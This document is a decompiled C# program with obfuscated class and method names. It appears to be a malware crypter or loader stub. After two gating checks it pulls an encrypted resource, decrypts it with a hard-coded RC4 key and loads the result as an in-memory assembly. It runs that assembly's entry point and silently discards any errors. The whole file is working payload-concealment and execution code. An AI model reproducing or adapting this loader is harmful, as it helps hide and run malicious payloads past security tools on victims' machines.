using System;
using System.Reflection;
using System.Resources;
using System.Text;
using ns0;
using ns6;

namespace ns8;

internal sealed class Class24
{
	private static void Main(string[] args)
	{
		if (!Class19.smethod_4() || !Class0.smethod_1())
		{
			return;
		}
		object[] parameters = new object[0];
		int num = new Random().Next(300, 750);
		long num2 = Environment.TickCount;
		_ = Environment.TickCount - num2;
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] rawAssembly = smethod_0((byte[])resourceManager.GetObject("776Nq9dqX2l7451SjqO"), "4y78yBHoA3hmv23V2mKzCzjnMK33iaJvrs4OnOQbevTDxpNR93Qr1WTFoUw");
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	public static byte[] smethod_0(byte[] bytes, string Key)
	{
		byte[] bytes2 = Encoding.Default.GetBytes(Key);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes2[i % bytes2.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < bytes.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			bytes[j] ^= array[num2];
		}
		return bytes;
	}
}
